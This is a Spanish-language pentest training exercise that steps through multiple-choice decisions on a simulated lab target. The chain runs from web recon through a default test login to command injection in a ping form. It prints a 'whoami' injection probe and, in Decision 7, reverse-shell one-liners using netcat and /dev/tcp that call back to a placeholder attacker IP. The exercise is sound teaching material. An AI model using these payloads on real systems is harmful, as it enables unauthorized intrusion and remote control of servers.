# Ejercicio a Ciegas #01 — Web Recon → Command Injection → Reverse Shell

> Práctica de metodología sin guía. Formato: escenario simulado + decisión en
> cada paso, con opciones múltiples. Pensado para repetir la lógica de
> "¿qué haría si estuviera completamente solo frente a esto?", no para
> memorizar comandos.

## Cómo usar este ejercicio

1. Lee el resultado de cada paso.
2. Antes de ver las opciones, intenta responder **tú mismo, en texto libre**:
   ¿qué harías y por qué?
3. Luego revisa las opciones — elige la que más se parezca a tu razonamiento.
4. Abre la respuesta (al final de cada bloque) y compara el *porqué*, no solo
   si acertaste la opción.

La meta no es acertar la opción "correcta" — es notar **por qué** las
opciones incorrectas son trampas comunes (saltarse pasos, asumir sin
evidencia, o gastar tiempo en algo de bajo retorno).

---

## Escenario inicial

```
Nmap scan report for 10.10.x.x
Host is up (0.02s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.5
80/tcp   open  http        Apache httpd 2.4.29
3306/tcp open  mysql       MySQL 5.7.29-0ubuntu0.18.04.1
```

No sabes nada más del objetivo.

### Decisión 1 — ¿Por dónde empiezas?

**A.** Corro `searchsploit` para las 3 versiones de servicio de una vez, buscando un CVE crítico.
**B.** Me enfoco en el puerto 80 primero: reviso la página, tecnología usada, `robots.txt`, antes de cualquier herramienta automatizada.
**C.** Lanzo `hydra` contra SSH con una wordlist de contraseñas comunes.
**D.** Lanzo `dirb`/`gobuster` de inmediato con la wordlist default.

<details>
<summary>Ver respuesta y razonamiento</summary>

**Correcta: B**

- **A es una trampa común:** versiones recientes y muy comunes (Apache
  2.4.29, OpenSSH 7.6p1, MySQL 5.7.29) casi nunca tienen un CVE crítico
  "de manual" — a diferencia de un software específico y viejo (ej.
  ProFTPD 1.3.5), buscar CVEs aquí de entrada rinde poco.
- **C es prematuro:** atacar SSH por fuerza bruta sin tener ni un solo
  usuario válido es ineficiente y ruidoso — no hay pista todavía que
  justifique ese esfuerzo.
- **D no es incorrecta per se, pero está fuera de orden:** lanzar fuerza
  bruta de directorios sin saber la tecnología del sitio te hace perder
  la oportunidad de ajustar la wordlist (extensión de archivo, patrones
  típicos del framework), y puede tardar mucho más de lo necesario.
- **B es la más barata y de mayor retorno:** mirar manualmente antes de
  automatizar da contexto gratis que mejora todo lo que hagas después.

</details>

---

## Resultado del paso 1

Landing page estática, sin login visible. `robots.txt` existe:
```
User-agent: *
Disallow: /admin_area/
```
`sitemap.xml` no existe. Headers muestran `X-Powered-By: PHP/7.2.24`.

### Decisión 2 — ¿Qué haces con el hallazgo de `robots.txt`?

**A.** Ignoro `/admin_area/` porque `robots.txt` es solo una sugerencia para buscadores, no significa nada técnico.
**B.** Lanzo fuerza bruta de directorios general primero, y si `/admin_area/` aparece ahí también, recién le hago caso.
**C.** Visito `/admin_area/` directamente — es una ruta confirmada por el propio servidor, con mayor probabilidad de ser relevante que una adivinada por wordlist.
**D.** Reporto la máquina como vulnerable de inmediato por exponer esa ruta en `robots.txt`.

<details>
<summary>Ver respuesta y razonamiento</summary>

**Correcta: C**

- **A es un error de criterio:** es cierto que `robots.txt` es una
  convención (no una barrera técnica), pero el hecho de que el admin lo
  haya puesto ahí significa que **la ruta existe y él la considera
  sensible** — ignorar esa señal desperdicia información gratuita.
- **B es ineficiente:** ya tienes la ruta confirmada al 100%, no hace
  falta "redescubrirla" con fuerza bruta cuando ya la tienes.
- **D confunde hallazgo con vulnerabilidad:** que una ruta exista no es
  en sí mismo un problema de seguridad — falta investigar qué hay ahí.

</details>

---

## Resultado del paso 2

`/admin_area/` muestra un formulario de login simple, apuntando a
`/admin_area/login.php`. Nada más visible en la página.

### Decisión 3 — ¿Qué intentas ahora?

**A.** Pruebo credenciales por defecto genéricas de inmediato (`admin:admin`, `root:root`, etc.) sin más investigación.
**B.** Reviso el código fuente de la página y la pestaña Network del navegador antes de intentar nada.
**C.** Lanzo `hydra` con una wordlist grande de usuarios/contraseñas contra ese login.
**D.** Asumo que como el backend es PHP, las credenciales default son `root`/(vacío), típicas de MySQL.

<details>
<summary>Ver respuesta y razonamiento</summary>

**Correcta: B**

- **A y D son la misma trampa con distinto disfraz:** ambas asumen un
  "default genérico" sin evidencia real que lo respalde. D además mezcla
  dos capas distintas del sistema (MySQL no es lo mismo que la lógica de
  autenticación de una app PHP custom) — es un error común confundir
  credenciales default de un *servicio* con las de una *aplicación* que
  corre sobre él.
- **C es prematuro y ruidoso:** fuerza bruta pesada antes de agotar
  información barata (código fuente, comentarios, comportamiento del
  formulario) es gastar tiempo y generar ruido innecesario.
- **B es la jugada de mayor retorno:** buscar pistas dejadas sin querer
  (comentarios de desarrollo, nombres de campos, requests de red) es
  gratis y muchas veces decisivo.

</details>

---

## Resultado del paso 3

Código fuente revela:
```html
<!-- TODO: remove test account before deploying -->
```
Network tab no muestra nada relevante (formulario POST simple, sin API separada).

### Decisión 4 — ¿Qué credenciales pruebas primero, basándote en la pista?

**A.** `admin` / `admin` — es el default más común en general.
**B.** `test` / `test` — coincide directamente con la palabra "test account" del comentario.
**C.** `root` / `root` — asumiendo que "test account" se refiere a una cuenta de administrador del sistema.
**D.** Lanzo `hydra` con una wordlist completa ya que no hay certeza de la contraseña exacta.

<details>
<summary>Ver respuesta y razonamiento</summary>

**Correcta: B**

- **A y C ignoran la pista específica que ya tienes** — "test account" no
  dice "admin" ni "root", dice literalmente "test". Ir con un default
  genérico cuando tienes una pista más específica es desperdiciar la
  evidencia recolectada.
- **D es excesivo en este punto:** con una pista tan directa, vale la
  pena probar manualmente la combinación obvia primero (`test`/`test`)
  antes de automatizar — es más rápido y más silencioso.

</details>

---

## Resultado del paso 4

`test` / `test` funciona. Login exitoso → dashboard con un formulario:
```html
<form method="POST" action="/admin_area/ping.php">
  <input type="text" name="host" placeholder="127.0.0.1">
  <button type="submit">Ping</button>
</form>
```

### Decisión 5 — ¿Qué piensas al ver un input que se usa para "ping"?

**A.** Es una herramienta de diagnóstico normal, reviso otras partes del panel.
**B.** Podría haber Command Injection si el input se concatena sin sanitizar dentro de un comando del sistema.
**C.** Pruebo directamente un exploit de Metasploit para "ping vulnerable" sin analizar más.
**D.** Superficie de ataque poco relevante, mejor seguir buscando otras rutas en `/admin_area/`.

<details>
<summary>Ver respuesta y razonamiento</summary>

**Correcta: B**

Cualquier funcionalidad que ejecute herramientas de red (`ping`, `traceroute`,
`nslookup`, etc.) a partir de un input de usuario es una bandera roja clásica
de Command Injection — es una de las categorías de vulnerabilidad más
buscadas cuando se ve este patrón de funcionalidad.

- **A y D subestiman una superficie de ataque clásica.**
- **C es prematuro:** no existe "un exploit genérico de ping" sin antes
  confirmar que el input realmente se pasa sin sanitizar a un comando de
  shell — hay que probarlo manualmente primero.

</details>

---

## Decisión 6 — ¿Cómo confirmas la sospecha de Command Injection?

**A.** Envío directamente un payload de reverse shell completo, sin probar antes.
**B.** Envío `127.0.0.1 ; whoami` para confirmar ejecución de un comando ajeno al ping.
**C.** Envío `' OR 1=1 --` (payload de SQL injection) para ver si algo cambia.
**D.** Reviso el código fuente del servidor por SSH, ya que tengo acceso a ese puerto.

<details>
<summary>Ver respuesta y razonamiento</summary>

**Correcta: B**

- **A se salta el paso de confirmación** — construir una reverse shell
  antes de confirmar que la inyección funciona es invertir el orden:
  primero se valida con algo simple y de bajo impacto (`whoami`), luego
  se escala a algo con efecto real.
- **C confunde tipos de vulnerabilidad** — SQLi y Command Injection son
  categorías distintas; el contexto (`ping`, no un query a base de
  datos) apunta claramente a la segunda.
- **D no tiene sentido aquí** — no tienes credenciales SSH válidas, y
  aunque las tuvieras, no es el camino más directo cuando ya sospechas
  de una vulnerabilidad web específica.

**Sintaxis de encadenamiento de comandos en bash:**
| Símbolo | Comportamiento |
|---|---|
| `;` | Ejecuta el segundo comando siempre, sin importar el resultado del primero |
| `&&` | Ejecuta el segundo solo si el primero tuvo éxito |
| `\|` | Pipe: la salida del primero es la entrada del segundo |
| `` ` `` / `$()` | Ejecuta un comando dentro de otro y sustituye el resultado |

</details>

---

## Resultado del paso 6

```
PING 127.0.0.1: 56 data bytes
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.045 ms
www-data
```

Confirmado: Command Injection, ejecución como `www-data`.

### Decisión 7 — ¿Cómo pasas de "ejecutar un comando suelto" a una shell interactiva?

**A.** Construyo un webshell PHP completo y lo escribo a `/var/www/html/` vía el mismo injection, para después visitarlo en el navegador.
**B.** Pongo un listener con `nc -lvnp <puerto>` en mi máquina, y desde el campo inyecto una reverse shell de una sola línea apuntando a mi IP.
**C.** Sigo mandando comandos sueltos uno por uno a través del formulario — es más simple que preparar una reverse shell.
**D.** Intento conectarme por SSH usando `www-data` como usuario, ya que es el usuario que tengo.

<details>
<summary>Ver respuesta y razonamiento</summary>

**Correcta: B (más directa y recomendada); A es válida como alternativa**

- **B es la opción de mayor eficiencia:** una sola línea de comando logra
  una shell interactiva completa, sin pasos adicionales de navegador ni
  archivos que dejar en el servidor.
- **A no está mal**, y es útil cuando `nc -e` no está disponible en el
  objetivo (algunas versiones de netcat lo compilan sin ese flag) — pero
  es más pasos y más superficie para errores de sintaxis al ir en una
  sola línea de comando.
- **C es poco práctico a escala** — cada comando requiere rellenar y
  enviar el formulario de nuevo, sin persistencia de directorio de
  trabajo, variables, etc. Funciona para probar, no para trabajar.
- **D no tiene sentido:** `www-data` es un usuario de servicio sin
  contraseña ni configuración para login interactivo por SSH.

**Payload de referencia (reverse shell con netcat):**
```bash
# En tu máquina atacante, primero:
nc -lvnp 1234

# Inyectado en el campo `host`:
127.0.0.1 ; nc <tu-IP> 1234 -e /bin/sh
```

> **Nota:** muchas instalaciones modernas de netcat (variante OpenBSD,
> default en Kali/Ubuntu recientes) vienen **sin el flag `-e`** por
> razones de seguridad. Alternativa cuando eso falla:
> ```bash
> 127.0.0.1 ; bash -i >& /dev/tcp/<tu-IP>/1234 0>&1
> ```

</details>

---

## Resultado final

```
Connection received on 10.10.x.x 52341
$ whoami
www-data
```

Shell interactiva obtenida. Fin del ejercicio.

---

## Resumen de la cadena completa

```
Recon manual del puerto 80 (sin herramientas automatizadas todavía)
        ↓
robots.txt revela /admin_area/ (información gratuita, no adivinada)
        ↓
Código fuente revela pista de "test account" (evidencia > suposición)
        ↓
Login con test/test exitoso
        ↓
Funcionalidad de "ping" identificada como superficie sospechosa
        ↓
Confirmación de Command Injection con payload mínimo (whoami)
        ↓
Escalada a shell interactiva con reverse shell de una línea
```

## Lección central del ejercicio

En cada punto de decisión, la opción correcta **nunca fue la más agresiva
o la más rápida** — fue la que mejor aprovechaba la evidencia ya disponible
antes de gastar esfuerzo en algo especulativo. Esa es la disciplina que
distingue metodología real de "probar cosas al azar hasta que algo funcione".
